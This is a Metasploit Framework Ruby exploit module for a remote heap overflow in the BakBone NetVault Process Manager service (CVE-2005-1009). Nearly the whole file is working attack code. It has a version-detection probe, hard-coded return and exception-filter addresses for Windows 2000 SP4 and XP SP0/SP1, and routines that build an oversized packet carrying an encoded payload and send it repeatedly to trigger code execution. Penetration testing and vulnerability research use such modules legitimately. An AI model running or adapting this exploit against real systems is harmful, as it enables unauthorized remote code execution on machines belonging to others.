##
# $Id: bakbone_netvault_heap.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BakBone NetVault Remote Heap Overflow',
			'Description'    => %q{
		This module exploits a heap overflow in the BakBone NetVault
	Process Manager service. This code is a direct port of the netvault.c
	code written by nolimit and BuzzDee.
			},
			'Author'         => [ 'hdm', '<nolimit.bugtraq[at]ri0tnet.net>' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2005-1009'],
					['OSVDB', '15234'],
					['BID', '12967'],
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x20",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP4 English',   { 'Ret' => 0x75036d7e, 'UEF' => 0x7c54144c } ],
					['Windows XP SP0/SP1 English', { 'Ret' => 0x7c369bbd, 'UEF' => 0x77ed73b4 } ],
				],

			'Privileged'     => false,
			'DisclosureDate' => 'Apr 01 2005'
			))

			register_options(
			[
				Opt::RPORT(20031)
			], self.class)
	end

	def check
		connect

		hname = "METASPLOIT"
		probe =
			"\xc9\x00\x00\x00\x01\xcb\x22\x77\xc9\x17\x00\x00\x00\x69\x3b\x69" +
			"\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69\x3b\x69" +
			"\x3b\x73\x3b\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00" +
			"\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00" +
			[ hname.length + 1 ].pack('V') + hname + "\x00"
		probe += "\x00" * (201 - probe.length)

		sock.put(probe)
		res = sock.get_once(1, 10)

		off = (res || '').index("NVBuild")

		if off
			off += 21
			ver  = res[off + 4, res[off, 4].unpack('V')[0]].to_i

			if ver > 0
				print_status("Detected NetVault Build #{ver}")
				return Exploit::CheckCode::Detected
			end
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		print_status("Trying target #{target.name}...")

		head =
			"\x00\x00\x02\x01\x00\x00\x00\x8f\xd0\xf0\xca\x0b\x00\x00\x00\x69" +
			"\x3b\x62\x3b\x6f\x3b\x6f\x3b\x7a\x3b\x00\x11\x57\x3c\x42\x00\x01" +
			"\xb9\xf9\xa2\xc8\x00\x00\x00\x00\x03\x00\x00\x00\x00\x01\xa5\x97" +
			"\xf0\xca\x05\x00\x00\x00\x6e\x33\x32\x3b\x00\x20\x00\x00\x00\x10" +
			"\x02\x4e\x3f\xac\x14\xcc\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01" +
			"\xa5\x97\xf0\xca\x05\x00\x00\x00\x6e\x33\x32\x3b\x00\x20\x00\x00" +
			"\x00\x10\x02\x4e\x3f\xc0\xa8\xea\xeb\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x01\xa5\x97\xf0\xca\x05\x00\x00\x00\x6e\x33\x32\x3b\x00\x20" +
			"\x00\x00\x00\x10\x02\x4e\x3f\xc2\x97\x2c\xd3\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\xb9\xf9\xa2\xc8\x02\x02\x00\x00\x00\xa5\x97\xf0\xca" +
			"\x05\x00\x00\x00\x6e\x33\x32\x3b\x00\x20\x00\x00\x00\x04\x02\x4e" +
			"\x3f\xac\x14\xcc\x0a\xb0\xfc\xe2\x00\x00\x00\x00\x00\xec\xfa\x8e" +
			"\x01\xa4\x6b\x41\x00\xe4\xfa\x8e\x01\xff\xff\xff\xff\x01\x02"

		pattern = make_nops(39947) + "\x00\x00\x00"
		p       = payload.encoded

		pattern[0, head.length]  = head
		pattern[32790, 2]        = "\xeb\x0a"
		pattern[32792, 4]        = [ target.ret ].pack('V')
		pattern[32796, 4]        = [ target['UEF'] ].pack('V')
		pattern[32800, p.length] = p

		sent = 0
		try  = 0

		15.times {
			try += 1
			connect
			sent = sock.put(pattern)
			disconnect
			break if sent == pattern.length
		}

		if (try == 15)
			print_error("Could not write full packet to server.")
			return
		end

		print_status("Overflow request sent, sleeping fo four seconds (#{try} tries)")
		select(nil,nil,nil,4)

		print_status("Attempting to trigger memory overwrite by reconnecting...")

		begin
			10.times { |x|
				connect
				sock.put(pattern)
				print_status("   Completed connection #{x}")
				sock.get_once(1, 1)
				disconnect
			}
		rescue
		end

		print_status("Waiting for payload to execute...")

		handler
		disconnect
	end

	def wfs_delay
		5
	end

end